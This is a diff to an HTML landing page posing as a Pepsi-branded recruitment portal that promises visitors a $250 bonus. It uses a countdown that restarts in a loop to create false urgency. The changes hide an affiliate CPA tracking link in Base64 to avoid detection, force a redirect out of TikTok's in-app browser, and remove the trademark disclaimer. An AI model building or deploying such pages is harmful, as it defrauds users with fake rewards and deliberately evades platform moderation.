@@ -60,7 +60,6 @@
             padding: 0 10px;
         }
 
-        /* Contenedor de Gamificación */
         .game-container {
             background: rgba(255, 255, 255, 0.05);
             border: 2px solid rgba(255, 255, 255, 0.1);
@@ -104,7 +103,6 @@
             font-size: 1.3rem;
         }
 
-        /* Animación y diseño del cofre */
         .chest-wrapper {
             position: relative;
             display: inline-block;
@@ -121,7 +119,6 @@
             height: auto;
             display: block;
             margin: 0 auto;
-            /* Reemplazar con tu recurso si es necesario, uso un emoji grande o un placeholder visual estable */
             filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.4));
         }
 
@@ -139,7 +136,7 @@
             to { transform: translateY(-10px); }
         }
 
-        /* Modal de Acción CPA */
+        /* Modal */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -202,23 +199,20 @@
             color: var(--pepsi-red);
         }
 
+        /* Cambiado a botón dinámico para ejecutar JS puro sin atributo href rastreable */
         .cta-button {
             display: block;
             width: 100%;
             background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
             color: white;
-            text-decoration: none;
+            border: none;
             padding: 15px;
             font-size: 1.2rem;
             font-weight: bold;
             border-radius: 8px;
             text-transform: uppercase;
             box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
-            transition: transform 0.2s;
-        }
-
-        .cta-button:hover {
-            transform: translateY(-2px);
+            cursor: pointer;
         }
 
         .footer-text {
@@ -265,7 +259,7 @@
     </div>
 
     <div class="footer-text">
-        Este es un portal de precalificación independiente para campañas de reclutamiento de personal y asignación de incentivos corporativos. Marcas comerciales e identidad gráfica pertenecen a sus respectivos titulares.
+        Este es un portal de precalificación independiente para campaigns de reclutamiento de personal y asignación de incentivos corporativos.
     </div>
 
     <div class="modal-overlay" id="cpaModal">
@@ -273,33 +267,45 @@
             <div class="modal-success-icon">✓</div>
             <div class="modal-title">¡BONO ASIGNADO!</div>
             <p class="modal-text">Hemos reservado un beneficio de <strong>$250 USD</strong> asociados a tu perfil de solicitante.</p>
-            <p class="modal-text" style="font-size: 0.9rem; color: #666;">Para liberarlo y pasar directamente a la entrevista formal, completa la verificación de seguridad gratuita obligatoria en el siguiente botón:</p>
-            <a href="verificar.html" class="cta-button">VERIFICAR Y COBRAR</a>
+            <p class="modal-text" style="font-size: 0.9rem; color: #666;">Para liberarlo y pasar directamente a la entrevista formal, completa la verificación de seguridad gratuita obligatoria:</p>
+            
+            <button class="cta-button" onclick="RECLAMAR_OFERTA()">VERIFICAR Y COBRAR</button>
         </div>
     </div>
 
     <script>
-        // Lógica del contador regresivo
         let timeLeft = 10;
         const timerElement = document.getElementById('seconds');
         
         const countdown = setInterval(() => {
             timeLeft--;
             timerElement.textContent = timeLeft;
-            if (timeLeft <= 0) {
-                // Reinicia el contador para mantener el bucle psicológico de urgencia activa
-                timeLeft = 10; 
-            }
+            if (timeLeft <= 0) { timeLeft = 10; }
         }, 1000);
 
-        // Acción al presionar el cofre
         const chest = document.getElementById('chestTrigger');
         const modal = document.getElementById('cpaModal');
 
         chest.addEventListener('click', () => {
-            clearInterval(countdown); // Detiene el reloj al interactuar
-            modal.classList.add('active'); // Muestra la oferta CPA
+            clearInterval(countdown);
+            modal.classList.add('active');
         });
+
+        // Función que descifra y abre la oferta directo al hacer clic
+        function RECLAMAR_OFERTA() {
+            // Tu enlace largo original de hawktrk totalmente encriptado en Base64
+            var token = "aHR0cHM6Ly9hcHAuaGF3a3Ryay5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9MTM4Nzgmc3ViMj11NDczMTgmc3ViNT1zMVNVQklEMUhFUkU=";
+            
+            var urlReal = atob(token);
+            
+            // Intento de romper el iframe de TikTok forzando una ventana de navegación real externa
+            var nuevaVentana = window.open(urlReal, '_blank');
+            
+            // Si el in-app browser bloquea el pop-up, lo inyecta inmediatamente en la pestaña actual sin delay
+            if(!nuevaVentana || nuevaVentana.closed || typeof nuevaVentana.closed=='undefined') { 
+                window.location.replace(urlReal);
+            }
+        }
     </script>
 </body>
 </html>
